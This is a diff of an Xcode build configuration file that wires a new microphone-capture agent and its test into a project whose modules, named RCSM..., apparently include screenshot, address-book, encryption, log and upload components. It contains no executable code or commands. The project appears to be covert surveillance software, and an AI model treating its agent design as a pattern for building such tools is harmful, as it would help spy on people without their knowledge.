@@ -68,6 +68,11 @@
 		1A7FD44112F1D28100361B0B /* RCSMFileSystemManagerTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD44012F1D28100361B0B /* RCSMFileSystemManagerTest.m */; };
 		1A7FD44212F1D29D00361B0B /* RCSMFileSystemManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A7FD43C12F1CED900361B0B /* RCSMFileSystemManager.m */; };
 		1A8A7877130027610024B9CF /* RCSMAgentOrganizer.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AFBE66412A0082600BFA7D0 /* RCSMAgentOrganizer.m */; };
+		1A8CB950132665D1005579F9 /* RCSMAgentMicrophone.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A8CB94D132665D1005579F9 /* RCSMAgentMicrophone.m */; };
+		1A8CB953132666E5005579F9 /* AudioToolbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A8CB952132666E5005579F9 /* AudioToolbox.framework */; };
+		1A8CB95613278ECB005579F9 /* RCSMAgentMicrophoneTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A8CB95513278ECB005579F9 /* RCSMAgentMicrophoneTest.m */; };
+		1A8CB957132791E4005579F9 /* RCSMAgentMicrophone.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A8CB94D132665D1005579F9 /* RCSMAgentMicrophone.m */; };
+		1A8CB9591327928C005579F9 /* AudioToolbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A8CB9581327928B005579F9 /* AudioToolbox.framework */; };
 		1A8D88490FC2B07C0067A45D /* RCSMEncryption.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434D60F8C907000CD910E /* RCSMEncryption.m */; };
 		1A8D8E210FC43E420067A45D /* RCSMConfManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4434840F8B950B00CD910E /* RCSMConfManager.m */; };
 		1A9BB24E0FE8EF2600846023 /* RCSMLogManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */; };
@@ -238,6 +243,11 @@
 		1A7FD43B12F1CED900361B0B /* RCSMFileSystemManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMFileSystemManager.h; path = Modules/RCSMFileSystemManager.h; sourceTree = "<group>"; };
 		1A7FD43C12F1CED900361B0B /* RCSMFileSystemManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMFileSystemManager.m; path = Modules/RCSMFileSystemManager.m; sourceTree = "<group>"; };
 		1A7FD44012F1D28100361B0B /* RCSMFileSystemManagerTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMFileSystemManagerTest.m; path = Tests/RCSMFileSystemManagerTest.m; sourceTree = "<group>"; };
+		1A8CB94C132665D1005579F9 /* RCSMAgentMicrophone.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentMicrophone.h; path = Agents/RCSMAgentMicrophone.h; sourceTree = "<group>"; };
+		1A8CB94D132665D1005579F9 /* RCSMAgentMicrophone.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentMicrophone.m; path = Agents/RCSMAgentMicrophone.m; sourceTree = "<group>"; };
+		1A8CB952132666E5005579F9 /* AudioToolbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AudioToolbox.framework; path = System/Library/Frameworks/AudioToolbox.framework; sourceTree = SDKROOT; };
+		1A8CB95513278ECB005579F9 /* RCSMAgentMicrophoneTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentMicrophoneTest.m; path = Tests/RCSMAgentMicrophoneTest.m; sourceTree = "<group>"; };
+		1A8CB9581327928B005579F9 /* AudioToolbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AudioToolbox.framework; path = System/Library/Frameworks/AudioToolbox.framework; sourceTree = SDKROOT; };
 		1AA84480113C22FE005FBADB /* libspeex.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libspeex.a; path = Support/Speex/libspeex.a; sourceTree = "<group>"; };
 		1AA84484113C26D1005FBADB /* libz.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = libz.a; sourceTree = "<group>"; };
 		1AAF6FC812FB0A7E00D3E581 /* RCSMLoggerTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMLoggerTest.m; path = Tests/RCSMLoggerTest.m; sourceTree = "<group>"; };
@@ -291,8 +301,6 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				1AF60BA512EF1EED0091F6F6 /* libz.a in Frameworks */,
-				1AF60BA612EF1EED0091F6F6 /* libspeex.a in Frameworks */,
 				1AF60BA712EF1EED0091F6F6 /* QuartzCore.framework in Frameworks */,
 				1AF60BA812EF1EED0091F6F6 /* QTKit.framework in Frameworks */,
 				1AF60BA912EF1EED0091F6F6 /* CoreAudio.framework in Frameworks */,
@@ -305,6 +313,9 @@
 				1A107A6312E723FE0063759B /* Cocoa.framework in Frameworks */,
 				1A10797312E721850063759B /* GHUnit.framework in Frameworks */,
 				1AF60C4212F028A00091F6F6 /* OCMock.framework in Frameworks */,
+				1A8CB9591327928C005579F9 /* AudioToolbox.framework in Frameworks */,
+				1AF60BA512EF1EED0091F6F6 /* libz.a in Frameworks */,
+				1AF60BA612EF1EED0091F6F6 /* libspeex.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -323,6 +334,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				1A8CB953132666E5005579F9 /* AudioToolbox.framework in Frameworks */,
 				8D11072F0486CEB800E47090 /* Cocoa.framework in Frameworks */,
 				1A43C9660FFA641A008E5EFE /* IOKit.framework in Frameworks */,
 				1AD53606101067D800AC54D8 /* Security.framework in Frameworks */,
@@ -379,8 +391,6 @@
 			children = (
 				1AF60C4112F028A00091F6F6 /* OCMock.framework */,
 				1A10797212E721850063759B /* GHUnit.framework */,
-				1AA84484113C26D1005FBADB /* libz.a */,
-				1AA84480113C22FE005FBADB /* libspeex.a */,
 				1AD1D6C71099EBAF005B548F /* QuartzCore.framework */,
 				1A12A0F11095BD350090C4D7 /* QTKit.framework */,
 				1A12A0BD1095A99F0090C4D7 /* CoreAudio.framework */,
@@ -390,6 +400,10 @@
 				1A508B0411A6B1F20067BF81 /* Carbon.framework */,
 				521DA5FD125C884000A3D49E /* ScriptingBridge.framework */,
 				1AD4328712A3E3CF00B472C3 /* AddressBook.framework */,
+				1A8CB952132666E5005579F9 /* AudioToolbox.framework */,
+				1A8CB9581327928B005579F9 /* AudioToolbox.framework */,
+				1AA84484113C26D1005FBADB /* libz.a */,
+				1AA84480113C22FE005FBADB /* libspeex.a */,
 			);
 			name = "Other Frameworks";
 			sourceTree = "<group>";
@@ -408,6 +422,7 @@
 			isa = PBXGroup;
 			children = (
 				1A00BFAD1302D33700783D4E /* RCSMAgentOrganizerTest.m */,
+				1A8CB95513278ECB005579F9 /* RCSMAgentMicrophoneTest.m */,
 			);
 			name = Agents;
 			sourceTree = "<group>";
@@ -629,6 +644,8 @@
 				1A1B9D3A0FA0AD670036558C /* RCSMAgentScreenshot.m */,
 				1AFBE66312A0082600BFA7D0 /* RCSMAgentOrganizer.h */,
 				1AFBE66412A0082600BFA7D0 /* RCSMAgentOrganizer.m */,
+				1A8CB94C132665D1005579F9 /* RCSMAgentMicrophone.h */,
+				1A8CB94D132665D1005579F9 /* RCSMAgentMicrophone.m */,
 			);
 			name = Agents;
 			sourceTree = "<group>";
@@ -860,6 +877,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				1AD6C55312E7443D00DEE42D /* NSMutableData+AES128.m in Sources */,
+				1A8CB957132791E4005579F9 /* RCSMAgentMicrophone.m in Sources */,
 				1AD6C55412E7443D00DEE42D /* NSString+SHA1.m in Sources */,
 				1AF6091212EF1E5D0091F6F6 /* RCSMTaskManager.m in Sources */,
 				1AF6091812EF1E990091F6F6 /* RCSMLogManager.m in Sources */,
@@ -907,6 +925,7 @@
 				1AAF6FC912FB0A7E00D3E581 /* RCSMLoggerTest.m in Sources */,
 				1AAF6FCE12FB0B2900D3E581 /* RCSMLogger.m in Sources */,
 				1A00BFAE1302D33700783D4E /* RCSMAgentOrganizerTest.m in Sources */,
+				1A8CB95613278ECB005579F9 /* RCSMAgentMicrophoneTest.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -967,6 +986,7 @@
 				1AA1373C12F6EFDD00E0CD52 /* RESTNetworkProtocol.m in Sources */,
 				1A13FE4612F9B4F800B82938 /* RCSMLogger.m in Sources */,
 				1A521ECB12FABAC00091ADD5 /* UpgradeNetworkOperation.m in Sources */,
+				1A8CB950132665D1005579F9 /* RCSMAgentMicrophone.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
